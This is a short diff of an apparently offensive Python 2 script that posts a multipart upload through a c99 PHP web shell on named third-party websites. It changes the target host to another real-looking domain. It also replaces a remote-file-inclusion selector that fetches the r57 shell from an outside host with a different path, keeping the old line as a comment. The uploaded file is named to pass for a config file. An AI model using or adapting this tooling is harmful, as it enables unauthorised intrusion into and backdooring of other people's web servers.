@@ -95,7 +95,7 @@ if __name__=='__main__':
     backdoor="c99"
 
     host="iberoriente.net"
-    
+    host="www.raneem.com" 
     fd=open('cmd.txt','r')
     text=fd.read()
     filename='conflg.php'
@@ -108,7 +108,8 @@ if __name__=='__main__':
         fields=[('act','Upload'),('miniform','1'),('submit','Upload')]
         files=[('uploadfile',filename,text)]
         shell="c99.php"
-    selector="/"+shell+"?page=http://www.ss3s.org/r57.txt?"
+    #selector="/"+shell+"?page=http://www.ss3s.org/r57.txt?"
+    selector="/support/c.php"
     #shell="daimon57.php"
     data=post_multipart(host, selector, fields, files, backdoor)
     print data
